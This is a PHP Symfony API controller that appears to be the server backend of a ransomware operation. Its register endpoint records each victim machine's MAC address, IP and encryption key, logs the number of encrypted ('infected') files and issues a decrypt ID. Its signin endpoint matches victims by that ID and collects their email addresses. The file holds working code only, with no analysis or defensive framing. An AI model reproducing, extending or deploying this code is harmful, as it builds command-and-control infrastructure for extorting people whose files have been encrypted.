<?php

namespace App\Controller\Api;

use App\Controller\BaseController;
use App\Entity\Log;
use App\Entity\User;
use App\Repository\LogRepository;
use App\Repository\UserRepository;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Uid\Uuid;

class UserController extends BaseController
{
    public function __construct(
        private UserPasswordHasherInterface $passwordHasher,
        private UserRepository $userRepository,
        private LogRepository $logRepository
    ) {}

    /**
     * @Route("/register", methods={"POST"})
     */
    public function register(Request $request): Response
    {
        try {
            $data = json_decode($request->getContent(), true);
            $macAdress = $data['macAddress'];

            $encryptionKey = $data['encryptionKey'];

            $user = $this->userRepository->findOneBy(['macAddress' => $macAdress]) ?? new User();
            $user->setIp($data['ip']);

            $uuid = Uuid::v4();

            $user->setMacAddress($macAdress)
                ->setPassword($this->passwordHasher->hashPassword(
                    $user,
                    $uuid
                ))
                ->setEncryptionKey($encryptionKey)
                ->setDecryptId($uuid)
                ->setRoles(['ROLE_USER']);

            $this->userRepository->save($user, true);

            $log = (new Log)
                ->setIp($data['ip']);

            if(array_key_exists('encryptedFiles', $data)) $log->setNumberInfectedFile($data['encryptedFiles']);

            $this->logRepository->save($log, true);

            return $this->json($user->getDecryptId());
        } catch(\Throwable $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }

    /**
     * @Route("/signin", methods={"POST"})
     */
    public function signin(Request $request): Response
    {
        try {
            $data = json_decode($request->getContent(), true);

            if(!array_key_exists('decryptId', $data)) {
                throw $this->createAccessDeniedException('Invalid decrypt Id');
            }

            $user = $this->userRepository->findOneBy(['decryptId' => $data['decryptId']]);

            if(!$user) {
                throw $this->createAccessDeniedException('Invalid decrypt Id');
            }

            if($data['email']) {
                $user->setEmail($data['email']);
                $this->userRepository->save($user, true);
            }

            return $this->json([
                'success' => true,
                'decryptId' => $user->getDecryptId()
            ]);
        } catch(\Throwable $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }
}